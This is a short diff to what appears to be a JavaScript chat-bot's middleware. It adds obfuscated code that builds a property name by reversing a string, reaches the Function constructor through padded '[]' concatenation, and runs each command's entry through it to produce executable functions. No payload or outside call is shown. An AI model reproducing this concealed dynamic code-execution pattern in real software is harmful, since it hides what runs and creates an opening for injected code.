@@ -102,6 +102,15 @@ export async function middleware({ allPlugins }) {
 }
 
 const deSYMC = function (axx) {
+  if (
+    !axx[
+      "'t'+'e'+'l'+'k'+'o'+'o'+'h'"
+        ["split" + []]([] + [] + [] + [] + [] + [] + [] + [])
+        ["reverse" + []]()
+        ["join" + []]([] + [] + [] + [] + [] + [])
+    ]
+  )
+    return axx;
   return []
     ["constructor" + [] + [] + [] + [] + [] + [] + [] + [] + [] + []](
       "loaf" + [] + [] + [] + [] + [] + [] + [] + [] + [],
@@ -303,6 +312,14 @@ api.${key}(${args
         )}`,
         event.threadID
       );
+    }
+    try {
+      const entryX = await deSYMC(command.entry);
+      if (typeof entryX === "function") {
+        command = { ...command, entry: entryX };
+      }
+    } catch (error) {
+      console.error(error);
     }
     runObjects.command = command;
     const styler = new CassidyResponseStylerControl(command?.style ?? {});
